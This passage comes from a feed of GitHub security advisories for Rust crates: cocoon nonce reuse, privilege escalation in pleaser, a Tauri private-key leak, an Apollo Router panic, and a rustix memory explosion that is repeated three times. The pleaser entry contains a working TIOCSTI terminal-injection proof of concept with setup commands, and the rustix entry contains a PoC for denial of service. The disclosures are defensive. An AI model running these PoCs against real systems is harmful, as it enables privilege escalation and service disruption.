        <content type="html"><![CDATA[<p><strong>Problem</strong>: Trying to create a new encrypted message with the same cocoon object generates the same ciphertext. It mostly affects <code>MiniCocoon</code> and <code>Cocoon</code> objects with custom seeds and RNGs (where <code>StdRng</code> is used under the hood).</p>
<p><strong>Note</strong>: The issue does <strong>NOT</strong> affect objects created with <strong><code>Cocoon::new</code></strong> which utilizes <code>ThreadRng</code>.</p>
<p><strong>Cause</strong>: <code>StdRng</code> produces the same nonce because <code>StdRng::clone</code> resets its state.</p>
<p><strong>Measure</strong>: Make encryption API mutable (<code>encrypt</code>, <code>wrap</code>, and <code>dump</code>).</p>
<p><strong>Workaround</strong>: Create a new cocoon object with a new <strong>seed</strong> per each encryption.</p>
<h2 id="how-to-reproduce">How to Reproduce</h2>
<pre><code class="language-rust">let cocoon = MiniCocoon::from_password(b"password", &amp;[1; 32]);
let mut data1 = "my secret data".to_owned().into_bytes();
let _ = cocoon.encrypt(&amp;mut data1)?;

let mut data2 = "my secret data".to_owned().into_bytes();
let _ = cocoon.encrypt(&amp;mut data2)?;

// data1: [23, 217, 251, 151, 179, 62, 85, 15, 253, 92, 192, 112, 200, 52]
// data2: [23, 217, 251, 151, 179, 62, 85, 15, 253, 92, 192, 112, 200, 52]
</code></pre>
<h2 id="workaround">Workaround</h2>
<p>For <code>cocoon &lt;= 0.3.3</code>, create a new cocoon with a different <strong>seed</strong> per each <code>encrypt</code>/<code>wrap</code>/<code>dump</code> call.</p>
<pre><code class="language-rust">let cocoon = MiniCocoon::from_password(b"password", &amp;[1; 32]);
let mut data1 = "my secret data".to_owned().into_bytes();
let _ = cocoon.encrypt(&amp;mut data1)?;

// Another seed: &amp;[2; 32].
let cocoon = MiniCocoon::from_password(b"password", &amp;[2; 32]);
let mut data2 = "my secret data".to_owned().into_bytes();
let _ = cocoon.encrypt(&amp;mut data2)?;

// data1: [23, 217, 251, 151, 179, 62, 85, 15, 253, 92, 192, 112, 200, 52]
// data2: [53, 223, 209, 96, 130, 99, 209, 108, 83, 189, 123, 81, 19, 1]
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fadeevab/cocoon/issues/22">https://github.com/fadeevab/cocoon/issues/22</a></li>
<li><a href="https://github.com/fadeevab/cocoon/commit/1b6392173ce35db4736a94b62b2d2973f9a71441">https://github.com/fadeevab/cocoon/commit/1b6392173ce35db4736a94b62b2d2973f9a71441</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0068.html">https://rustsec.org/advisories/RUSTSEC-2023-0068.html</a></li>
<li><a href="https://github.com/advisories/GHSA-6878-6wc2-pf5h">https://github.com/advisories/GHSA-6878-6wc2-pf5h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6878-6wc2-pf5h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-24T19:22:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pleaser] Pleaser privilege escalation vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-cgf8-h3fp-h956</id>
        <link href="https://github.com/advisories/GHSA-cgf8-h3fp-h956"/>
        <updated>2023-11-09T05:04:04.000Z</updated>
        <content type="html"><![CDATA[<p>please (aka pleaser) through 0.5.4 allows privilege escalation through the TIOCSTI and/or TIOCLINUX ioctl. (If both TIOCSTI and TIOCLINUX are disabled, this cannot be exploited.)</p>
<p>Here is how to see it in action:</p>
<pre><code>$ cd "$(mktemp -d)"
$ git clone --depth 1 https://gitlab.com/edneville/please.git
$ cd please/
$ git rev-parse HEAD  # f3598f8fae5455a8ecf22afca19eaba7be5053c9
$ cargo test &amp;&amp; cargo build --release
$ echo "[${USER}_as_nobody]"$'\nname='"${USER}"$'\ntarget=nobody\nrule=.*\nrequire_pass=false' | sudo tee /etc/please.ini
$ sudo chown root:root ./target/release/please
$ sudo chmod u+s ./target/release/please
$ cat &lt;&lt;TIOCSTI_C_EOF | tee TIOCSTI.c
#include &lt;sys/ioctl.h&gt;

int main(void) {
  const char *text = "id\n";
  while (*text)
    ioctl(0, TIOCSTI, text++);
  return 0;
}
TIOCSTI_C_EOF
$ gcc -std=c99 -Wall -Wextra -pedantic -o /tmp/TIOCSTI TIOCSTI.c
$ ./target/release/please -u nobody /tmp/TIOCSTI  # runs id(1) as ${USER} rather than nobody
</code></pre>
<p>Please note that:</p>
<p>This affects both the case where root wants to drop privileges as well when non-root wants to gain other privileges.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46277">https://nvd.nist.gov/vuln/detail/CVE-2023-46277</a></li>
<li><a href="https://github.com/rustsec/advisory-db/pull/1798">https://github.com/rustsec/advisory-db/pull/1798</a></li>
<li><a href="https://gitlab.com/edneville/please/-/issues/13">https://gitlab.com/edneville/please/-/issues/13</a></li>
<li><a href="https://gitlab.com/edneville/please/-/merge_requests/69#note_1594254575">https://gitlab.com/edneville/please/-/merge_requests/69#note_1594254575</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2023-0066.html">https://rustsec.org/advisories/RUSTSEC-2023-0066.html</a></li>
<li><a href="https://github.com/advisories/GHSA-cgf8-h3fp-h956">https://github.com/advisories/GHSA-cgf8-h3fp-h956</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cgf8-h3fp-h956</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-10-20T06:30:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tauri-cli] Tauri's Updater Private Keys Possibly Leaked via Vite Environment Variables]]></title>
        <id>https://github.com/advisories/GHSA-2rcp-jvr4-r259</id>
        <link href="https://github.com/advisories/GHSA-2rcp-jvr4-r259"/>
        <updated>2023-11-09T05:04:31.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This advisory is not describing a vulnerability in the Tauri code base itself but a commonly used misconfiguration which could lead to leaking of the private key and updater key password into bundled Tauri applications using the Vite frontend in a specific configuration.</p>
<p>The Tauri documentation used an insecure example configuration in the <a href="https://tauri.app/v1/guides/getting-started/setup/vite/">Vite guide</a> to showcase how to use Tauri together with Vite. </p>
<p>Copying the following snippet <code>envPrefix: ['VITE_', 'TAURI_'],</code> from this guide into the <code>vite.config.ts</code> of a Tauri project possibly leads to bundling the <code>TAURI_PRIVATE_KEY</code> and <code>TAURI_KEY_PASSWORD</code> into the Vite frontend code and therefore leaking this value to the debug built of a Tauri application.</p>
<p>The value is automatically bundled into debug builds but for production builds it is not embedded, as long as it is not directly referenced in the frontend code. Vite statically replaces these values in production builds. This reduces the amount of affected applications to a very small amount of affected applications.</p>
<p>To verify if you are affected you can search for the private key value or the <code>TAURI_PRIVATE_KEY</code> variable inside the release build frontend assets (<code>dist/</code>).</p>
<blockquote>
<p>Example: <code>grep -r "TAURI_PRIVATE_KEY" dist/</code></p>
</blockquote>
<p>Using only the <code>envPrefix: ['VITE_'],</code> or any other framework than Vite means you are not impacted by this advisory.</p>
<h3 id="patches">Patches</h3>
<p>The documentation has been patched but as the root cause is not in Tauri itself the issue is not fixed by updating Tauri.
The <code>vite.config.ts</code> configuration of the project needs to be adapted.</p>
<p>We recommend rotating your updater private key if you are affected by this (requires Tauri CLI &gt;=1.5.5). After updating the envPrefix configuration, generate a new private key with <code>tauri signer generate</code>, saving the new private key and updating the updater's <code>pubkey</code> value on <code>tauri.conf.json</code> with the new public key. To update your existing application, the next application build must be signed with the older private key in order to be accepted by the existing application.</p>
<h3 id="workarounds">Workarounds</h3>
<p>The <code>envPrefix: ['VITE_'],</code>should be used and the desired <code>TAURI</code> variables manually added.
Respective these variables could be added <code>TAURI_PLATFORM</code>, <code>TAURI_ARCH</code>, <code>TAURI_FAMILY</code>, <code>TAURI_PLATFORM_VERSION</code>, <code>TAURI_PLATFORM_TYPE</code> and <code>TAURI_DEBUG</code> without leaking sensitive information.</p>
<p>We urge affected users to implement the workaround as the <code>1.x</code> branch will not receive a general prevention fix as it would break systems.</p>
<h3 id="references">References</h3>
<p>The issue was originally disclosed in our discord <a href="https://discord.com/channels/616186924390023171/1164260301655523409">here</a>.
The affected guide is <a href="https://tauri.app/v1/guides/getting-started/setup/vite/">https://tauri.app/v1/guides/getting-started/setup/vite/</a>.</p>
<blockquote>
<p>Update: We lowered the severity from high to low, as the likelihood of impact was found to only affect a <strong>very limited</strong> amount of applications.</p>
</blockquote>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/tauri-apps/tauri/security/advisories/GHSA-2rcp-jvr4-r259">https://github.com/tauri-apps/tauri/security/advisories/GHSA-2rcp-jvr4-r259</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46115">https://nvd.nist.gov/vuln/detail/CVE-2023-46115</a></li>
<li><a href="https://github.com/tauri-apps/tauri/commit/8b166e9bf82e69ddb3200a3a825614980bd8d433">https://github.com/tauri-apps/tauri/commit/8b166e9bf82e69ddb3200a3a825614980bd8d433</a></li>
<li><a href="https://discord.com/channels/616186924390023171/1164260301655523409">https://discord.com/channels/616186924390023171/1164260301655523409</a></li>
<li><a href="https://tauri.app/v1/guides/getting-started/setup/vite/">https://tauri.app/v1/guides/getting-started/setup/vite/</a></li>
<li><a href="https://github.com/advisories/GHSA-2rcp-jvr4-r259">https://github.com/advisories/GHSA-2rcp-jvr4-r259</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2rcp-jvr4-r259</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-10-20T15:18:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apollo-router] Apollo Router vulnerable to Improper Check or Handling of Exceptional Conditions]]></title>
        <id>https://github.com/advisories/GHSA-r344-xw3p-2frj</id>
        <link href="https://github.com/advisories/GHSA-r344-xw3p-2frj"/>
        <updated>2023-11-06T05:01:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Apollo Router is a configurable, high-performance graph router written in Rust to run a federated supergraph that uses Apollo Federation. Affected versions are subject to a Denial-of-Service (DoS) type vulnerability which causes the Router to panic and terminate when a multi-part response is sent. When users send queries to the router that uses the <code>@defer</code> or Subscriptions, the Router will panic.</p>
<p>To be vulnerable, users of Router must have a coprocessor with <code>coprocessor.supergraph.response</code> configured in their <code>router.yaml</code> and also to support either <code>@defer</code> or Subscriptions.  </p>
<h3 id="patches">Patches</h3>
<p>Router version 1.33.0 has a fix for this vulnerability. <a href="https://github.com/apollographql/router/pull/4014">https://github.com/apollographql/router/pull/4014</a> fixes the issue.  </p>
<h3 id="workarounds">Workarounds</h3>
<p>For affected versions, avoid using the coprocessor supergraph response:</p>
<pre><code class="language-yml"># do not use this stage in your coprocessor configuration
coprocessor:
  supergraph:
    response:
</code></pre>
<p>Or you can disable defer and subscriptions support:</p>
<pre><code class="language-yml"># disable defer and subscriptions:
supergraph:
  defer_support: false # enabled by default
subscription:
  enabled: false # disabled by default
</code></pre>
<p>and continue to use the coprocessor supergraph response.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/apollographql/router/issues/4013">https://github.com/apollographql/router/issues/4013</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/apollographql/router/security/advisories/GHSA-r344-xw3p-2frj">https://github.com/apollographql/router/security/advisories/GHSA-r344-xw3p-2frj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-45812">https://nvd.nist.gov/vuln/detail/CVE-2023-45812</a></li>
<li><a href="https://github.com/apollographql/router/issues/4013">https://github.com/apollographql/router/issues/4013</a></li>
<li><a href="https://github.com/apollographql/router/pull/4014">https://github.com/apollographql/router/pull/4014</a></li>
<li><a href="https://github.com/apollographql/router/commit/b917b8c117b46a2d508428c0856f4927dfcfc341">https://github.com/apollographql/router/commit/b917b8c117b46a2d508428c0856f4927dfcfc341</a></li>
<li><a href="https://github.com/advisories/GHSA-r344-xw3p-2frj">https://github.com/advisories/GHSA-r344-xw3p-2frj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r344-xw3p-2frj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-10-19T16:08:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rustix] rustix's `rustix::fs::Dir` iterator with the `linux_raw` backend can cause memory explosion]]></title>
        <id>https://github.com/advisories/GHSA-c827-hfw6-qwvm</id>
        <link href="https://github.com/advisories/GHSA-c827-hfw6-qwvm"/>
        <updated>2023-10-18T18:27:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When using <code>rustix::fs::Dir</code> using the <code>linux_raw</code> backend, it's possible for the iterator to "get stuck" when an IO error is encountered. Combined with a memory over-allocation issue in <code>rustix::fs::Dir::read_more</code>, this can cause quick and unbounded memory explosion (gigabytes in a few seconds if used on a hot path) and eventually lead to an OOM crash of the application.</p>
<h3 id="details">Details</h3>
<h4 id="discovery">Discovery</h4>
<p>The symptoms were initially discovered in <a href="https://github.com/imsnif/bandwhich/issues/284">https://github.com/imsnif/bandwhich/issues/284</a>. That post has lots of details of our investigation. See <a href="https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993">this post</a> and the <a href="https://discord.com/channels/273534239310479360/1161137828395237556">Discord thread</a> for details.</p>
<h4 id="diagnosis">Diagnosis</h4>
<p>This issue is caused by the combination of two independent bugs:</p>
<ol>
<li>Stuck iterator</li>
</ol>
<ul>
<li>The <code>rustix::fs::Dir</code> iterator can fail to halt after encountering an IO error, causing the caller to be stuck in an infinite loop.</li>
</ul>
<ol start="2">
<li>Memory over-allocation</li>
</ol>
<ul>
<li><code>Dir::read_more</code> incorrectly grows the read buffer unconditionally each time it is called, regardless of necessity.</li>
</ul>
<p>Since <code>&lt;Dir as Iterator&gt;::next</code> calls <code>Dir::read</code>, which in turn calls <code>Dir::read_more</code>, this means an IO error encountered during reading a directory can lead to rapid and unbounded growth of memory use.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-rust">fn main() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {
    // create a directory, get a FD to it, then unlink the directory but keep the FD
    std::fs::create_dir("tmp_dir")?;
    let dir_fd = rustix::fs::openat(
        rustix::fs::CWD,
        rustix::cstr!("tmp_dir"),
        rustix::fs::OFlags::RDONLY | rustix::fs::OFlags::CLOEXEC,
        rustix::fs::Mode::empty(),
    )?;
    std::fs::remove_dir("tmp_dir")?;

    // iterator gets stuck in infinite loop and memory explodes
    rustix::fs::Dir::read_from(dir_fd)?
        // the iterator keeps returning `Some(Err(_))`, but never halts by returning `None`
        // therefore if the implementation ignores the error (or otherwise continues
        // after seeing the error instead of breaking), the loop will not halt
        .filter_map(|dirent_maybe_error| dirent_maybe_error.ok())
        .for_each(|dirent| {
            // your happy path
            println!("{dirent:?}");
        });

    Ok(())
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>If a program tries to access a directory with its file descriptor after the file has been unlinked (or any other action that leaves the <code>Dir</code> iterator in the stuck state), and the implementation does not break after seeing an error, it can cause a memory explosion.</p>
<p>As an example, Linux's various virtual file systems (e.g. <code>/proc</code>, <code>/sys</code>) can contain directories that spontaneously pop in and out of existence. Attempting to iterate over them using <code>rustix::fs::Dir</code> directly or indirectly (e.g. with the <code>procfs</code> crate) can trigger this fault condition if the implementation decides to continue on errors.</p>
<p>An attacker knowledgeable about the implementation details of a vulnerable target can therefore try to trigger this fault condition via any one or a combination of several available APIs. If successful, the application host will quickly run out of memory, after which the application will likely be terminated by an OOM killer, leading to denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm">https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm</a></li>
<li><a href="https://github.com/imsnif/bandwhich/issues/284">https://github.com/imsnif/bandwhich/issues/284</a></li>
<li><a href="https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993">https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159">https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec">https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6">https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5">https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5</a></li>
<li><a href="https://discord.com/channels/273534239310479360/1161137828395237556">https://discord.com/channels/273534239310479360/1161137828395237556</a></li>
<li><a href="https://github.com/advisories/GHSA-c827-hfw6-qwvm">https://github.com/advisories/GHSA-c827-hfw6-qwvm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c827-hfw6-qwvm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-18T18:27:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rustix] rustix's `rustix::fs::Dir` iterator with the `linux_raw` backend can cause memory explosion]]></title>
        <id>https://github.com/advisories/GHSA-c827-hfw6-qwvm</id>
        <link href="https://github.com/advisories/GHSA-c827-hfw6-qwvm"/>
        <updated>2023-10-18T18:27:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When using <code>rustix::fs::Dir</code> using the <code>linux_raw</code> backend, it's possible for the iterator to "get stuck" when an IO error is encountered. Combined with a memory over-allocation issue in <code>rustix::fs::Dir::read_more</code>, this can cause quick and unbounded memory explosion (gigabytes in a few seconds if used on a hot path) and eventually lead to an OOM crash of the application.</p>
<h3 id="details">Details</h3>
<h4 id="discovery">Discovery</h4>
<p>The symptoms were initially discovered in <a href="https://github.com/imsnif/bandwhich/issues/284">https://github.com/imsnif/bandwhich/issues/284</a>. That post has lots of details of our investigation. See <a href="https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993">this post</a> and the <a href="https://discord.com/channels/273534239310479360/1161137828395237556">Discord thread</a> for details.</p>
<h4 id="diagnosis">Diagnosis</h4>
<p>This issue is caused by the combination of two independent bugs:</p>
<ol>
<li>Stuck iterator</li>
</ol>
<ul>
<li>The <code>rustix::fs::Dir</code> iterator can fail to halt after encountering an IO error, causing the caller to be stuck in an infinite loop.</li>
</ul>
<ol start="2">
<li>Memory over-allocation</li>
</ol>
<ul>
<li><code>Dir::read_more</code> incorrectly grows the read buffer unconditionally each time it is called, regardless of necessity.</li>
</ul>
<p>Since <code>&lt;Dir as Iterator&gt;::next</code> calls <code>Dir::read</code>, which in turn calls <code>Dir::read_more</code>, this means an IO error encountered during reading a directory can lead to rapid and unbounded growth of memory use.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-rust">fn main() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {
    // create a directory, get a FD to it, then unlink the directory but keep the FD
    std::fs::create_dir("tmp_dir")?;
    let dir_fd = rustix::fs::openat(
        rustix::fs::CWD,
        rustix::cstr!("tmp_dir"),
        rustix::fs::OFlags::RDONLY | rustix::fs::OFlags::CLOEXEC,
        rustix::fs::Mode::empty(),
    )?;
    std::fs::remove_dir("tmp_dir")?;

    // iterator gets stuck in infinite loop and memory explodes
    rustix::fs::Dir::read_from(dir_fd)?
        // the iterator keeps returning `Some(Err(_))`, but never halts by returning `None`
        // therefore if the implementation ignores the error (or otherwise continues
        // after seeing the error instead of breaking), the loop will not halt
        .filter_map(|dirent_maybe_error| dirent_maybe_error.ok())
        .for_each(|dirent| {
            // your happy path
            println!("{dirent:?}");
        });

    Ok(())
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>If a program tries to access a directory with its file descriptor after the file has been unlinked (or any other action that leaves the <code>Dir</code> iterator in the stuck state), and the implementation does not break after seeing an error, it can cause a memory explosion.</p>
<p>As an example, Linux's various virtual file systems (e.g. <code>/proc</code>, <code>/sys</code>) can contain directories that spontaneously pop in and out of existence. Attempting to iterate over them using <code>rustix::fs::Dir</code> directly or indirectly (e.g. with the <code>procfs</code> crate) can trigger this fault condition if the implementation decides to continue on errors.</p>
<p>An attacker knowledgeable about the implementation details of a vulnerable target can therefore try to trigger this fault condition via any one or a combination of several available APIs. If successful, the application host will quickly run out of memory, after which the application will likely be terminated by an OOM killer, leading to denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm">https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm</a></li>
<li><a href="https://github.com/imsnif/bandwhich/issues/284">https://github.com/imsnif/bandwhich/issues/284</a></li>
<li><a href="https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993">https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159">https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec">https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6">https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5">https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5</a></li>
<li><a href="https://discord.com/channels/273534239310479360/1161137828395237556">https://discord.com/channels/273534239310479360/1161137828395237556</a></li>
<li><a href="https://github.com/advisories/GHSA-c827-hfw6-qwvm">https://github.com/advisories/GHSA-c827-hfw6-qwvm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c827-hfw6-qwvm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-18T18:27:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rustix] rustix's `rustix::fs::Dir` iterator with the `linux_raw` backend can cause memory explosion]]></title>
        <id>https://github.com/advisories/GHSA-c827-hfw6-qwvm</id>
        <link href="https://github.com/advisories/GHSA-c827-hfw6-qwvm"/>
        <updated>2023-10-18T18:27:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When using <code>rustix::fs::Dir</code> using the <code>linux_raw</code> backend, it's possible for the iterator to "get stuck" when an IO error is encountered. Combined with a memory over-allocation issue in <code>rustix::fs::Dir::read_more</code>, this can cause quick and unbounded memory explosion (gigabytes in a few seconds if used on a hot path) and eventually lead to an OOM crash of the application.</p>
<h3 id="details">Details</h3>
<h4 id="discovery">Discovery</h4>
<p>The symptoms were initially discovered in <a href="https://github.com/imsnif/bandwhich/issues/284">https://github.com/imsnif/bandwhich/issues/284</a>. That post has lots of details of our investigation. See <a href="https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993">this post</a> and the <a href="https://discord.com/channels/273534239310479360/1161137828395237556">Discord thread</a> for details.</p>
<h4 id="diagnosis">Diagnosis</h4>
<p>This issue is caused by the combination of two independent bugs:</p>
<ol>
<li>Stuck iterator</li>
</ol>
<ul>
<li>The <code>rustix::fs::Dir</code> iterator can fail to halt after encountering an IO error, causing the caller to be stuck in an infinite loop.</li>
</ul>
<ol start="2">
<li>Memory over-allocation</li>
</ol>
<ul>
<li><code>Dir::read_more</code> incorrectly grows the read buffer unconditionally each time it is called, regardless of necessity.</li>
</ul>
<p>Since <code>&lt;Dir as Iterator&gt;::next</code> calls <code>Dir::read</code>, which in turn calls <code>Dir::read_more</code>, this means an IO error encountered during reading a directory can lead to rapid and unbounded growth of memory use.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-rust">fn main() -&gt; Result&lt;(), Box&lt;dyn std::error::Error&gt;&gt; {
    // create a directory, get a FD to it, then unlink the directory but keep the FD
    std::fs::create_dir("tmp_dir")?;
    let dir_fd = rustix::fs::openat(
        rustix::fs::CWD,
        rustix::cstr!("tmp_dir"),
        rustix::fs::OFlags::RDONLY | rustix::fs::OFlags::CLOEXEC,
        rustix::fs::Mode::empty(),
    )?;
    std::fs::remove_dir("tmp_dir")?;

    // iterator gets stuck in infinite loop and memory explodes
    rustix::fs::Dir::read_from(dir_fd)?
        // the iterator keeps returning `Some(Err(_))`, but never halts by returning `None`
        // therefore if the implementation ignores the error (or otherwise continues
        // after seeing the error instead of breaking), the loop will not halt
        .filter_map(|dirent_maybe_error| dirent_maybe_error.ok())
        .for_each(|dirent| {
            // your happy path
            println!("{dirent:?}");
        });

    Ok(())
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>If a program tries to access a directory with its file descriptor after the file has been unlinked (or any other action that leaves the <code>Dir</code> iterator in the stuck state), and the implementation does not break after seeing an error, it can cause a memory explosion.</p>
<p>As an example, Linux's various virtual file systems (e.g. <code>/proc</code>, <code>/sys</code>) can contain directories that spontaneously pop in and out of existence. Attempting to iterate over them using <code>rustix::fs::Dir</code> directly or indirectly (e.g. with the <code>procfs</code> crate) can trigger this fault condition if the implementation decides to continue on errors.</p>
<p>An attacker knowledgeable about the implementation details of a vulnerable target can therefore try to trigger this fault condition via any one or a combination of several available APIs. If successful, the application host will quickly run out of memory, after which the application will likely be terminated by an OOM killer, leading to denial of service.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm">https://github.com/bytecodealliance/rustix/security/advisories/GHSA-c827-hfw6-qwvm</a></li>
<li><a href="https://github.com/imsnif/bandwhich/issues/284">https://github.com/imsnif/bandwhich/issues/284</a></li>
<li><a href="https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993">https://github.com/imsnif/bandwhich/issues/284#issuecomment-1754321993</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159">https://github.com/bytecodealliance/rustix/commit/31fd98ca723b93cc6101a3e29843ea5cf094e159</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec">https://github.com/bytecodealliance/rustix/commit/87481a97f4364d12d5d6f30cdd025a0fc509b8ec</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6">https://github.com/bytecodealliance/rustix/commit/df3c3a192cf144af0da8a57417fb4addbdc611f6</a></li>
<li><a href="https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5">https://github.com/bytecodealliance/rustix/commit/eecece4a84fc58eafdc809cc2cedd374dee876a5</a></li>
<li><a href="https://discord.com/channels/273534239310479360/1161137828395237556">https://discord.com/channels/273534239310479360/1161137828395237556</a></li>
<li><a href="https://github.com/advisories/GHSA-c827-hfw6-qwvm">https://github.com/advisories/GHSA-c827-hfw6-qwvm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c827-hfw6-qwvm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-18T18:27:47.000Z</published>
    </entry>
</feed>